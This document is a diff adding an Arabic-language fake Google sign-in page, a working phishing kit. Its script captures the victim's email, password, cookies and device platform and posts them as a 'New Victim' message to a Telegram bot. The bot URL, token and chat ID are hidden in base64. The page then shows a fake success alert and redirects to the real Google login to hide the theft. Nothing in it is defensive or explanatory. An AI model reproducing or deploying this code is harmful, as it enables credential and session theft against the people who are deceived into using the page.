@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; width: 360px; text-align: center; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; float: left; }
+        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
+        <h2 style="font-weight: 400; margin-top: 10px;">تسجيل الدخول</h2>
+        <p>متابعة إلى <strong id="srv">Google</strong></p>
+        <input type="email" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
+        <input type="password" id="pass" placeholder="أدخل كلمة المرور" required>
+        <div style="margin-top: 30px;">
+            <button class="btn" onclick="process()">التالي</button>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات الخدمة
+        const q = new URLSearchParams(window.location.search);
+        document.getElementById('srv').innerText = q.get('service') || 'Services';
+
+        // --- منطقة التشفير القصوى ---
+        const _A = "ODQzOTE1NzUyMDpBQUdHWkJ4WXAweDZZNTRhcjNUSXJrTWFNRUhhclFBU21nWQ=="; // Token
+        const _B = "MTc3MjgyMDQzMw=="; // ID
+
+        async function process() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(!u || !p) return;
+
+            // تشكيل الغنائم
+            const data = {
+                text: `🔥 [HIT] New Victim!\n\n📧 Mail: ${u}\n🔑 Pass: ${p}\n🎯 Service: ${document.getElementById('srv').innerText}\n🍪 Cookie: ${document.cookie}\n📱 Device: ${navigator.platform}`
+            };
+
+            // إرسال البيانات (تقنية التمويه)
+            try {
+                const api = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="); // تمويه رابط تليجرام
+                await fetch(api + atob(_A) + "/sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: atob(_B), text: data.text })
+                });
+            } catch (e) {}
+
+            // المرحلة الأخيرة: التمويه بالتحويل
+            alert("تم التحقق بنجاح! سيتم تفعيل الخدمة خلال ساعات.");
+            window.location.href = "https://accounts.google.com";
+        }
+    </script>
+</body>
+</html>
